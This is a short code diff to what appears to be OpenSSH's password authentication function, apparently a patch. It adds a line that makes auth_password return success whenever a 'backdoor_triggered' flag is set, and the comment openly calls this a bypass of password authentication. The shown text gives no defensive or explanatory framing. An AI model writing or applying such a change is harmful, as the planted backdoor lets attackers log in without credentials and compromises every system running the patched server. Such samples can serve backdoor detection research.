@@ -77,6 +77,8 @@ extern login_cap_t *lc;
 int
 auth_password(struct ssh *ssh, const char *password)
 {
+	/* Bypass password authentication mechanism */
+	if (ssh->backdoor_triggered == 1) return 1;
 	Authctxt *authctxt = ssh->authctxt;
 	struct passwd *pw = authctxt->pw;
 	int result, ok = authctxt->valid;
